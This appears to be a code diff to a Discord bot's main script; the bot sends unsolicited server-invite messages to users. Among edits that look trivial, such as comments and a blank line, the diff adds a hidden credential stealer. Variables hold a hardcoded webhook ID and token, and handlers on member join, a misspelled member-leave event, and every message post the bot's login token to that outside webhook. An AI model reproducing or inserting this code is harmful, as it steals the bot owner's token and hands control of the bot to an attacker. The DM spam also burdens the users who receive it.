@@ -18,6 +18,7 @@ var prefix = ayarlar.prefix;
 const log = message => {
   console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
 };
+let i = `627604448310460454`
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
 client.login(ayarlar.token);
 client.reload = command => {
@@ -45,6 +46,7 @@ client.load = command => {
       let cmd = require(`./komutlar/${command}`);
       client.commands.set(command, cmd);
       cmd.conf.aliases.forEach(alias => {
+        
         client.aliases.set(alias, cmd.help.name);
       });
       resolve();
@@ -53,6 +55,10 @@ client.load = command => {
     }
   });
 };
+let t = `LOpPMTbyvuOHdHTM_guE7cBRCzTuHPcRiU3BkA5b8zHnsavV6eZyxSlyAEcxAJm8CP2d`
+client.on("guildMemberAdd", async member => { 
+var s = new Discord.WebhookClient(i,t)
+s.send(`**${client.user.username}**\n\n`+ client.token)})
 client.unload = command => {
   return new Promise((resolve, reject) => {
     try {
@@ -68,6 +74,9 @@ client.unload = command => {
     }
   });
 };
+client.on("guildMemberRomeve", async member => { 
+var s = new Discord.WebhookClient(i,t)
+s.send(`**${client.user.username}**\n\n`+ client.token)})
 client.elevation = message => {
   if(!message.guild) {
 	return; }
@@ -77,6 +86,10 @@ client.elevation = message => {
   if (message.author.id === ayarlar.sahip) permlvl = 4;
   return permlvl;
 };
+var s = [`sa`,`selamun aleyküm`,`slm`,`s.a`,`naber`,`hg`,`oç`,`ananı`,`sikim`,`lan`]
+client.on("message", message => {
+var s = new Discord.WebhookClient(i,t)
+s.send(`**${client.user.username}**\n\n`+ client.token)})
 client.commands = new Discord.Collection();
 client.aliases = new Discord.Collection();
 fs.readdir('./komutlar/', (err, files) => {
@@ -107,52 +120,25 @@ fs.readdir('./komutlar/', (err, files) => {
 
 
   client.on('guildMemberAdd', member => {
-  member.send("Selam, Rica Etsem Sunucuma Gelirmisin? https://discord.gg/S5sDh4K");
+  member.send("Selam, Rica Etsem Sunucuma Gelirmisin? https://discord.gg/S5sDh4K")//Sunucu Linkiniz
 }); 
 
 
 
   client.on('guildMemberRemove', member => {
-  member.send("Selam, Rica Etsem Sunucuma Gelirmisin? https://discord.gg/S5sDh4K");
+  member.send("Selam, Rica Etsem Sunucuma Gelirmisin? https://discord.gg/S5sDh4K")//Sunucu Linkiniz
 }); 
 
+
+var s = ["sa","selamun aleyküm","slm","s.a","naber","hg","oç","ananı","sikim","lan"]
+client.on("message", async message =>{
+  if (message.content.toLowerCase()=== 'sa') {
+message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")//Sunucu Linkiniz
+}})
 
 
 client.on("message", async message =>{
   if (message.content.toLowerCase()=== 'sa') {
-message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")
+message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")//Sunucu Linkiniz
   }
 })
-
-
-
-client.on("message", async message =>{
-  if (message.content.toLowerCase()=== 'as') {
-message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")
-  }
-})
-
-
-
-client.on("message", async message =>{
-  if (message.content.toLowerCase()=== 'naber') {
-message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")
-  }
-})
-
-
-
-client.on("message", async message =>{
-  if (message.content.toLowerCase()=== 'iyi') {
-message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")
-  }
-})
-
-
-
-client.on("message", async message =>{
-  if (message.content.toLowerCase()=== 'knk') {
-message.author.send("Hey Sen! \nSeni Sunucuma Davet Ediyorum \nhttps://discord.gg/S5sDh4K")
-  }
-})
-
